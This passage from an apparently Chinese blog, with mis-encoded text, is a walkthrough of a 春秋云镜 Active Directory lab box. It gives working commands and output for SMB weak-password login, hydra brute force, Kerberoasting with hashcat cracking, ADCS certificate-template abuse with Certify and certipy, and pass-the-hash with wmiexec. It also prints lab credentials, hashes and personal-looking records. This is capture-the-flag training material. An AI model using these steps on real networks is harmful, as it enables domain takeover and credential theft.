ç«¯å£å¼€æ”¾ 172.22.9.26:139[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:135[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.26:135[2025-04-17 00:40:06] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.47:22 =&gt; [ssh] ç‰ˆæœ¬:7.6p1 Ubuntu 4ubuntu0.7 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.][2025-04-17 00:40:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.47:21 =&gt; [ftp] ç‰ˆæœ¬:3.0.3 äº§å“:vsftpd ç³»ç»Ÿ:Unix Banner:[220 (vsFTPd 3.0.3).][2025-04-17 00:40:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.19:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-17 00:40:11] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:88 =&gt;[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.19:80 =&gt; [http] ç‰ˆæœ¬:1.18.0 äº§å“:nginx ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.26:445 =&gt;[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:80 =&gt; [http][2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:445 =&gt;[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:389 =&gt;[2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:139 =&gt; Banner:[.][2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.26:139 =&gt; Banner:[.][2025-04-17 00:40:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.47:80 =&gt; [http][2025-04-17 00:41:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.47:445 =&gt;[2025-04-17 00:41:07] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.47:139 =&gt;[2025-04-17 00:41:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.7:135 =&gt;[2025-04-17 00:41:12] [SUCCESS] æœåŠ¡è¯†åˆ« 172.22.9.26:135 =&gt;[2025-04-17 00:41:12] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 16[2025-04-17 00:41:12] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-17 00:41:12] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ftp, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle[2025-04-17 00:41:12] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.9.19 çŠ¶æ€ç :200 é•¿åº¦:612 æ ‡é¢˜:Welcome to nginx![2025-04-17 00:41:12] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.9.26ä¸»æœºå: DESKTOP-CBKTVMOå‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.9.26[2025-04-17 00:41:12] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.9.47 çŠ¶æ€ç :200 é•¿åº¦:10918 æ ‡é¢˜:Apache2 Ubuntu Default Page: It works[2025-04-17 00:41:12] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.9.7 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.7 DC:XIAORANG\\XIAORANG-DC[2025-04-17 00:41:12] [SUCCESS] NetInfo æ‰«æç»“æœç›®æ ‡ä¸»æœº: 172.22.9.7ä¸»æœºå: XIAORANG-DCå‘ç°çš„ç½‘ç»œæ¥å£: IPv4åœ°å€: â””â”€ 172.22.9.7[2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.26 DESKTOP-CBKTVMO.xiaorang.lab Windows Server 2016 Datacenter 14393[2025-04-17 00:41:12] [SUCCESS] SMBè®¤è¯æˆåŠŸ 172.22.9.47:445 administrator:123456[2025-04-17 00:41:12] [INFO] ç³»ç»Ÿä¿¡æ¯ 172.22.9.47 [Windows 6.1][2025-04-17 00:41:12] [SUCCESS] NetBios 172.22.9.47 fileserver Windows 6.1[2025-04-17 00:41:12] [INFO] SMB2å…±äº«ä¿¡æ¯ 172.22.9.47:445 administrator Pass:123456 å…±äº«:[print$ fileshare IPC$][2025-04-17 00:41:12] [SUCCESS] ç›®æ ‡: http://172.22.9.7:80 æ¼æ´ç±»å‹: poc-yaml-active-directory-certsrv-detect æ¼æ´åç§°: è¯¦ç»†ä¿¡æ¯: author:AgeloVito links:https://www.cnblogs.com/EasonJim/p/6859345.html ä¸Šæ¥å°±æ‰«åˆ°åŸŸæ§çš„æ¼æ´äº†ï¼Œä½†æ˜¯ç°åœ¨è¿˜æ²¡æœ‰ä»€ä¹ˆå¯ç”¨çš„ä¿¡æ¯æ²¡åŠæ³•ç›´æ¥æ‰“ã€‚ 172.22.9.47:445 smbæœåŠ¡å­˜åœ¨ä¸€ä¸ªå¼±å£ä»¤ç™»é™†ä¸€ä¸‹çœ‹çœ‹ 1234567891011121314151617181920212223242526272829â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# smbclient //172.22.9.47/fileshare -U administrator%123465Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Wed Jul 13 04:12:10 2022 .. D 0 Wed Jul 13 00:35:09 2022 personnel.db A 61440 Wed Jul 13 03:46:55 2022 secret D 0 Wed Apr 16 11:57:06 2025 Certified_Pre-Owned.7z N 9572925 Wed Jul 13 04:12:03 2022 Certified_Pre-Owned.pdf N 10406101 Wed Jul 13 04:08:14 2022 41152812 blocks of size 1024. 36033208 blocks availablesmb: \\&gt; cd ..smb: \\&gt; ls . D 0 Wed Jul 13 04:12:10 2022 .. D 0 Wed Jul 13 00:35:09 2022 personnel.db A 61440 Wed Jul 13 03:46:55 2022 secret D 0 Wed Apr 16 11:57:06 2025 Certified_Pre-Owned.7z N 9572925 Wed Jul 13 04:12:03 2022 Certified_Pre-Owned.pdf N 10406101 Wed Jul 13 04:08:14 2022 41152812 blocks of size 1024. 36033208 blocks availablesmb: \\&gt; cd secretsmb: \\secret\\&gt; ls . D 0 Wed Apr 16 11:57:06 2025 .. D 0 Wed Jul 13 04:12:10 2022 flag02.txt N 659 Wed Apr 16 11:57:06 2025 41152812 blocks of size 1024. 36033208 blocks available æ‰¾åˆ°flag02äº† FLAG3&amp;FLAG4flag02.txté‡Œè¿˜ç»™äº†ä¸€ä¸ªæç¤º 1Yes, you have enumerated smb. But do you know what an SPN is? æŠŠæ‰€æœ‰æ–‡ä»¶éƒ½ä¸‹è½½ä¸‹æ¥çœ‹ä¸€çœ‹, 1234567891011121314sqlite&gt; select * from xr_users ;1|admin|admin2|******|i9XDE02pLVf3|******|6N70jt2K9sV4|******|fiAzGwEMgTYsqlite&gt; select * from xr_members ;1|huangmin|1|26|15220647319|huangmin@xiaorang.lab2|zhangrong|1|36|13073815024|zhangrong@xiaorang.lab3|liying|1|29|13126874319|liying@xiaorang.lab4|zhaoli|1|44|13075613024|zhaoli@xiaorang.lab5|zhangyan|0|35|15254139260|zhangyan@xiaorang.lab6|zhoujing|1|32|15123481906|zhoujing@xiaorang.lab7|liuying|1|24|13078310649|liuying@xiaorang.lab....... personnel.dbé‡Œé¢æœ‰ç”¨æˆ·å’Œ3ä¸ªä¸çŸ¥é“ç”¨æˆ·åçš„å¯†ç ï¼Œå…ˆå°†æ•°æ®å¤„ç†ä¸€ä¸‹å§ï¼Œå°†xr_userså’Œxr_membersçš„å†…å®¹åˆ†åˆ«ä¿å­˜åˆ°passå’Œuseré‡Œ 1234567891011121314151617181920212223242526272829â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat pass|awk -F&#x27;|&#x27; &#x27;&#123;print($3)&#125;&#x27;&gt;pass.txtâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat pass.txtadmini9XDE02pLVf6N70jt2K9sVfiAzGwEMgTYâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat user|awk -F&#x27;|&#x27; &#x27;&#123;print($2)&#125;&#x27; &gt;username.txtâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat username.txthuangminzhangrongliyingzhaolizhangyanzhoujingliuyingwanghaowangqiangwangluzhaoyongzhangliwangningwangyu... ç”¨hydraçˆ†ç ´ï¼Œå¯ä»¥çˆ†ç ´å‡ºæ¥ä¸¤ä¸ªç”¨æˆ· 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# hydra -L username.txt -P pass.txt 172.22.9.26 smbHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-16 13:02:49[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 1 task per 1 server, overall 1 task, 1236 login tries (l:309/p:4), ~1236 tries per task[DATA] attacking smb://172.22.9.26:445/[445][smb] host: 172.22.9.26 login: zhangjian password: i9XDE02pLVf[445][smb] host: 172.22.9.26 login: liupeng password: fiAzGwEMgTY ç„¶åè¿›è¡ŒKerberoastæ”»å‡» 123456789101112131415â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-GetUserSPNs -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVfImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companiesServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation------------------------------------- -------- -------- -------------------------- --------- ----------TERMSERV/desktop-cbktvmo.xiaorang.lab zhangxia 2023-07-14 00:45:45.213944 &lt;never&gt;WWW/desktop-cbktvmo.xiaorang.lab/IIS zhangxia 2023-07-14 00:45:45.213944 &lt;never&gt;TERMSERV/win2016.xiaorang.lab chenchen 2023-07-14 00:45:39.767035 &lt;never&gt;[-] CCache file is not found. Skipping...$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$d0a75403c0fd68eb28e523ec82bbcc13$5d435dfada83bc3decd547576a2e0e533633be1ba2ca116bf3944fce42987d3a695c18247303f24a3f5b295919ed0bd0a682c106b81a1e733cf5b27d8816b85b5506c6cd1c04a7eefb3a12f46c00f1483854c51afb647d8fd064e86bc839305531c7a2cd3639f0b79fe070b1c3d10135ee7fc258f1abecec4bcad5d82c3b6a1031235a312c34e669df79ad94ed4a5ddd19f8919e26d5cbe49108176f7a1f52b21a438be962732cd3c7dfbd709b3ee3b7f0ffd4f8817aef4da2ebd5f2339538a6ee44a6e455a0d0ef760238d871f2a01d742aadf0a6dab09e4dac1b37fa317ef49f0bc9ed332df6a15eceabb304cae0d04df2e349ea41f193c8c41c9bbc8876db2cb6edf7ea19dffcbaa75b2e8cc062d873b7697397ae963d8454d867983429b9a24371a2b7b2ded8bb30454fc5c0c92346d0a00f706a04a3fab6a4dd59760f53107727237a316546634868fc926f582409cad4b4ab5674ef0994c60a1256b9677b9069818967813c3cd508a71e6e10fef1ddcbec756bb24cd1ed1d47ba09bed8d199398bf40cb19ecb0298342ca5eb67091f99a66c1cf2b62cb2fea208df89e75245d570e3e6617889d2c3f65be9c64747c21b2cdae4d1f9b06bdd921c46668c433952d0297d575e04e053e33f6251407793efc6e781406a2342a82d4a1939538883c6dff90f8c7845e140332b37efc66cb4d38f7ad7a4d3c66ef6c2d20b56e8de9a5db8db344e18a72a86f7b0447752356e35f6bc97cf328221921735aa58772dc5b800db10ccd461c95783887ad9a065b7b360365b03e5966f9886fd4b5db3472db78c2a7f514f767984e2944a89912e7d4d0bc8c56e7043b9f4bcebe6ea9d1fe4a6715630f1362b2ae5bf62f25c45d3a9fe2ac85e61728c57d1940f21ed763c403d21794e80bace45f553be48d3d367616d735dfc517573d75a418518e90f28c621b3fc614c1e89a7a7a07056a6a849587666ea91dd6b649d7f73356b8c4807f453b0d3209a52f3b99f81012a76dd0ff159d968dd15ad4c7c035792cd1d56f7c537418a3b466b0f6fa2038b159999f2620b20e14f452d3dee9052fac011c78eb3bff235ea41f85aa82e56c8fca3c626a18255f47c40e3e20ddf3c34083f99e9005b61efaa61f939786a024a86e5f56ee1920a452f7f74a66f8ddbfac75eebfd468bc99b2266d2638d7fbf9dae6ba76b36f97cb452eee2bc129553b5c7725b1dc5a6f91a0d67e9cfb3079024ac0c7379a8b1f6eb76223d021233bf75b8279d7d4b01211dbd4b3baaa1c566b945fd757cbe0e8eee3f7ca8df0e2133848109d16df8fddf6b2e62922c9eca4c980cc6949ed145a146b7d1e2ca5fed6c1b378f4963afb15e8c02120467c33f3b30dec45c39da63c7f847513ea72614af712ccb867c6fb31fc135f9690d543a34f6bba84114d71915c021e9a8ade8a50a96c311940bd680e314f4bc8c5a90376b5a313000d497372e4278713368219da610794a1fe1ff560f6c36f4b31e70b63a06c8$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$756eb4d4a5fe99658d9e4329a03d65a5$7ac1c23cb3d99bb83a38e222924cacfb56f615a4f9b9024b7c8e0879221f744b82ca58662adb97a7a3aa3f7cc6a0095f1b3e8f1cbb2e89433341f2399b12841eba64593a74ce3d6ea849ed9dbb5bda3918470942af00817782299bcb2c44c5b9723aaecf746cf760466f47fdfe5aecf6586e249f0bf305d437747b27e29d2a78d78a897fdb0cfe05a903d35e8e8c31f74091fa6b0886ca297c5ae56b656a67f0dee88e9bcfc8f720f172bfcb8df630ad566a2118f7b862f460fb9a28afee2f3e92069bc8bd3862d0812e3fca7991d851238ca3872cb190d091e3cca90adf4da38d364bc759831d0e61fd2a17864389989b4b1dd49d6ddabc60619d6788947bea7ac1a6040e201e362cbefbff3adb78434a80c66511ef8860493dc94dea833b94bf9b6477a986485e4ee3ab05c91d1ab6ffb8679247bcbfea6c2b51fc15a4ce37ce815e2a7a6185ee09f3bcb05e0c3d31b65d642c3a8cf7546125d03260500675da2efe3c15c234a2bc9f5139a3612d521ad0e8315b3bcde7c3f628c723222c20d19937c8a3497ca4763326686a54c619c2d730e03a6a3247615f4ebde209c7a1e87c1c351fdbf16afb6268755646e14dd2f0ee14a977c4bf1ad0231fc7e4a33ec018e790b5a8d103c9a2ba9f8f0877929c54eda6ffcd936658f2e876273ba5eeef5066ea031c1176bbf365a88e8627f4143173155e5a93920e5722d93054ab1d3596fab388acca607372a94f427a2b7555d6d7e2a0fde397de943b9c34b9d2f9f552dea129a2e1120137ff2a2894e4f19725ad4b282c5be4fe370f428ab9ee0b7bcb30d5ab0a334726edd459ce838630ef6905f6a91640ea3096ca2ebe18691f956c7d017c437aa6219ba880d9948daf8738f30af06b5c6038763dbe9e4b6abf29cdb5ebd742fdf7b334817a29f4a927ce294db573acfb69a7b9b3d4b34e758d0ee3901633c13b15365b3aa50db5cd66ac1a83ed3230dcd3396510eed1554ef6dddd485ae97d4b2385a60833a104672a55b3740a8b57c1f9dfe167fe1e16c6f2c4446c3297ef067441a5a536db4697f979e246cb3abb5aa46a41cc140ccf89b23b503e5975f2cd845e4822a0b1d7b240d6c63e225278745e97c2e32ce7ca1efb2d911c4076911b78fe26adaf5d2289b5e0e76cb0ff50e20e61a8ff76cd0ea14275cb64cb34c219c7a9b4cea7fa0255848fecefa0849a32ffa14f3491e7f83ad092506f123b16df02eb00090e12b2bb5b60291ef8a9d57d6d3fd8505ddf799fa0a56e6309b03f372002090da40e7419e75629c0b518ac4d011b709fcf7866c1a581b7e0a5ac0ae28af906d7b95334c1098eeb3ec94a4e3623b72f60a53182d6f02d60790642400e687954328e1224c473bf010f3c73fd3184269f4cf3d9cb91178a962cb085f3dd45abb794437fbb348904fb12440e7c6ed237d97422ddbde2b0ef6c912a4c4ff86b4153a266f103dd9d69b8806d44e57f0271fa6db4b6b02021a0bdd55ee38323fc9f8d7bbb0a8b å¯ä»¥æ‹¿åˆ°ä¸¤ä¸ªç”¨æˆ·çš„hashï¼Œç”¨hashcatçˆ†ç ´ 123456789101112hashcat hash /usr/share/wordlists/rockyou.txtâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# hashcat hash --showHash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:13100 | Kerberos 5, etype 23, TGS-REP | Network ProtocolNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!Do NOT report auto-detect issues unless you are certain of the hash type.$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$2fef93477c96377b81b856c0a918b0f8$7b12ec73692a807cdb959eaeabd253a016b9a6617e9e882016aeba5e5c1f28e4e1d9bb1ce3cfedba110b3c628726b1b50585672544354fae17ec956eff2e27c39494cf3a08d7ab530114273c7d2332866c1483791d6a32b0fea66422abd61412b64b6bd672e30cf844a1da47c8c1cf6791e00abadb34423301ead5ba16fd13631a7a2e29bafaaa9d55a6f9063ef06838953339018d2a077e7c4db47fec5c341c2c53562bf772bd047f5035aade21b9c0c2ad8dc1eec04aa2a1f9e120c6f1508b734895b0ac1cf384ee3b01ffc723b963826221c291f0fbedf92c8f42d549c611b547d1a5bd2cb93c149b8fb01ecc0d785ca8615d49f2d77015c4431d3a122d723936f57e7abb137ce18d22ced5690de6fc3daa6c45f81f97a4427a8c9adb6665eb3ed0010961f38a8860aaaba72a49b67ec435f7ada78ccab514b6c4e465bf0a9b3c14f3e62f580b79d811d2814e3c952dd9a7cacf451632035e1f819a0289913b6f536d317a920b025da509fec7ad356b4d62d892080a87274e2cda87823971f719275afa7b00615cb43e00c586dc09d2f48d909944d352ef0f1b96b74e924c33b4d7a71618c6aaeea94c7b1b61fdc3cbda2b3a0074942a982e7c63258b58ffc74ca532760ad3da4d1b3f5275330457877de4d840477b03c1dbef4ab68bfbfc0400bb63082c9fdc3ca13cc89a8b91846e06d69a8d713aa7e184cc7ed888df935d42580969a9bb00fd61887bd7c55eca669e14ef8705fcb9d5515218c991935c5b37973b363ba58453543a7033e1869d6e1f4304c1887274b04bbe3bea1a24556698ba5fb21218100cfbd73fc5d09e424786f6e64b39e36c7d86b751c502d9f101a368e575c0be0fe4660db85b5d8c13af3c06c870bf3db18e9e7056256d29b153fc6724f6778c8502b763178a34d1fcd67c172d9a943f0a55b972b0d68f0d9507cfbd8acac33d5b340c6db1728a6ff79537e91c9fde40764b79448cf5f122080d770a860baf50a76a08076ac52de4d671cc8bd84f79bda7c0a52988b62a2954f7fe274ab0ad008cdbf8c3710d7d9cd263d9479c3309de5fec18ce56758e056dcfd942500adea9a14da3555e29e9277f8ca07af73299f70472137f7cd045b60f639f14b3bcfcf635c4ec0c0359c4d7238121af36fa7fb29316d4a45890c0973e432fb2b617256cfeec85c8496c506e79c31e4507eaf5ecc7d67540eed5fec810cdcf6d1682156597450c27b27ad617fdf0fd03abe04d181e58cec2af1edc85e243102c8db404aaaca939c42a54d633585eb7e26348ff26951c5cc8c6271d227520fdea38033174b4efddf6a589688223b263e8808fdbc85bbe20ea471fb529216d802776dcc3a7ef68334059213d49640da993c067719c0b119f9c3914295dedefcbd89f0facf3ba3700227de362e49f88302bf87e4cfc5787b364951e3301efa5ff817f5dbf372536ec3aa4:@Passw0rd@ ç„¶åç”¨chenchen@xiaorang.lab:@Passw0rd@è¿›è¡Œè¿œç¨‹æ¡Œé¢ç™»å½•,ç”¨bloodhoundè¿›è¡Œä¿¡æ¯æœé›†ï¼ˆå…¶å®ä¹Ÿä¸ç”¨ï¼Œå› ä¸ºä¹‹å‰fscanå·²ç»æ‰«åˆ°æ´äº†ï¼‰ 1234567891011121314151617181920â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# bloodhound-python -u chenchen -p @Passw0rd@ -d xiaorang.lab -c all --dns-tcp -ns 172.22.9.7 --auth-method ntlm --zipINFO: Found AD domain: xiaorang.labINFO: Connecting to LDAP server: xiaorang-dc.xiaorang.labINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 2 computersINFO: Connecting to LDAP server: xiaorang-dc.xiaorang.labINFO: Found 95 usersINFO: Found 52 groupsINFO: Found 2 gposINFO: Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: DESKTOP-CBKTVMO.xiaorang.labINFO: Querying computer: XIAORANG-DC.xiaorang.labINFO: Done in 00M 06SINFO: Compressing output into 20250416132802_bloodhound.zip ä¸Šä¼ Certify.exeæŸ¥æ‰¾æ˜“å—æ”»å‡»çš„è¯ä¹¦ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273C:\\Users\\chenchen\\Desktop\\æ–°å»ºæ–‡ä»¶å¤¹&gt;Certify.exe find /vulnerable _____ _ _ __ / ____| | | (_)/ _| | | ___ _ __| |_ _| |_ _ _ | | / _ \\ &#x27;__| __| | _| | | | | |___| __/ | | |_| | | | |_| | \\_____\\___|_| \\__|_|_| \\__, | __/ | |___./ v1.0.0[*] Action: Find certificate templates[*] Using the search base &#x27;CN=Configuration,DC=xiaorang,DC=lab&#x27;[*] Listing info about the Enterprise CA &#x27;xiaorang-XIAORANG-DC-CA&#x27; Enterprise CA Name : xiaorang-XIAORANG-DC-CA DNS Hostname : XIAORANG-DC.xiaorang.lab FullName : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA Flags : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED Cert SubjectName : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab Cert Thumbprint : 37BFD9FE73CA81E18E7A87CEBD90AF267E57170E Cert Serial : 43A73F4A37050EAA4E29C0D95BC84BB5 Cert Start Date : 2023/7/14 12:33:21 Cert End Date : 2028/7/14 12:43:21 Cert Chain : CN=xiaorang-XIAORANG-DC-CA,DC=xiaorang,DC=lab UserSpecifiedSAN : Disabled CA Permissions : Owner: BUILTIN\\Administrators S-1-5-32-544 Access Rights Principal Allow Enroll NT AUTHORITY\\Authenticated UsersS-1-5-11 Allow ManageCA, ManageCertificates BUILTIN\\Administrators S-1-5-32-544 Allow ManageCA, ManageCertificates XIAORANG\\Domain Admins S-1-5-21-990187620-235975882-534697781-512 Allow ManageCA, ManageCertificates XIAORANG\\Enterprise Admins S-1-5-21-990187620-235975882-534697781-519 Enrollment Agent Restrictions : None[!] Vulnerable Certificates Templates : CA Name : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CA Template Name : XR Manager Schema Version : 2 Validity Period : 1 year Renewal Period : 6 weeks msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS Authorized Signatures Required : 0 pkiextendedkeyusage : å®‰å…¨ç”µå­é‚®ä»¶, åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ, å®¢æˆ·ç«¯èº«ä»½éªŒè¯ mspki-certificate-application-policy : å®‰å…¨ç”µå­é‚®ä»¶, åŠ å¯†æ–‡ä»¶ç³»ç»Ÿ, å®¢æˆ·ç«¯èº«ä»½éªŒè¯ Permissions Enrollment Permissions Enrollment Rights : NT AUTHORITY\\Authenticated UsersS-1-5-11 XIAORANG\\Domain Admins S-1-5-21-990187620-235975882-534697781-512 XIAORANG\\Domain Users S-1-5-21-990187620-235975882-534697781-513 XIAORANG\\Enterprise Admins S-1-5-21-990187620-235975882-534697781-519 Object Control Permissions Owner : XIAORANG\\Administrator S-1-5-21-990187620-235975882-534697781-500 WriteOwner Principals : XIAORANG\\Administrator S-1-5-21-990187620-235975882-534697781-500 XIAORANG\\Domain Admins S-1-5-21-990187620-235975882-534697781-512 XIAORANG\\Enterprise Admins S-1-5-21-990187620-235975882-534697781-519 WriteDacl Principals : XIAORANG\\Administrator S-1-5-21-990187620-235975882-534697781-500 XIAORANG\\Domain Admins S-1-5-21-990187620-235975882-534697781-512 XIAORANG\\Enterprise Admins S-1-5-21-990187620-235975882-534697781-519 WriteProperty Principals : XIAORANG\\Administrator S-1-5-21-990187620-235975882-534697781-500 XIAORANG\\Domain Admins S-1-5-21-990187620-235975882-534697781-512 XIAORANG\\Enterprise Admins S-1-5-21-990187620-235975882-534697781-519Certify completed in 00:00:10.1629693 12CA Name : XIAORANG-DC.xiaorang.lab\\xiaorang-XIAORANG-DC-CATemplate Name : XR Manage è¿™ä¸ªå¯ä»¥æ‰“ 123456789101112131415161718192021â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# certipy-ad req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -template &#x27;XR Manager&#x27; -upn administrator@xiaorang.labCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Successfully requested certificate[*] Request ID is 7[*] Got certificate with UPN &#x27;administrator@xiaorang.lab&#x27;[*] Certificate has no object SID[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: administrator@xiaorang.lab[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;administrator.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;administrator&#x27;[*] Got hash for &#x27;administrator@xiaorang.lab&#x27;: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 å¾—åˆ°äº†administratorçš„å“ˆå¸Œäº†ï¼Œæ‹¿ä¸‹åŸŸæ§äº†ï¼Œç›´æ¥ç™»å½•è¿™å°ä¸»æœºå’ŒåŸŸæ§æ‹¿flagå³å¯ 1234â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-wmiexec --hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 administrator@172.22.9.26","categories":[{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜¥ç§‹äº‘é•œ-Brute4Road","slug":"æ˜¥ç§‹äº‘é•œ-Brute4Road","date":"2025-04-15T06:35:35.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/04/15/æ˜¥ç§‹äº‘é•œ-Brute4Road/","permalink":"https://lvzhouhang.xyz/2025/04/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/","excerpt":"","text":"FLAG1&amp;FLAG2å…ˆç”¨fscanæ‰«ä¸€ä¸‹ 1234567891011121314151617181920212223242526272829303132â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ../pentest/fscan/fscan2 -h 39.99.231.184â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-15 02:37:33] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-15 02:37:33] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-15 02:37:33] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1[2025-04-15 02:37:33] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-15 02:37:33] [INFO] 